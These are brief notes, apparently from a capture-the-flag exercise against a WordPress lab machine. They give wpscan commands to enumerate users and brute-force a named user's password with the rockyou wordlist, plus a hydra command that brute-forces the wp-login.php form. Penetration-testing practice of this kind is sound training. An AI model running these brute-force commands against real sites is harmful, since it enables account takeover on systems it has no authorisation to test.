

wpscan can search for vulns, run first

enum users with wpscan
`wpscan --url http://<ip> -e u`
Brute force users with wpscan
`wpscan --url http://<ip> --usernames c0ldd -P /usr/share/wordlists/rockyou.txt`

Brute force with hydra
`hydra -L wpusers -P /usr/share/wordlists/rockyou.txt colddboxeasy -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`
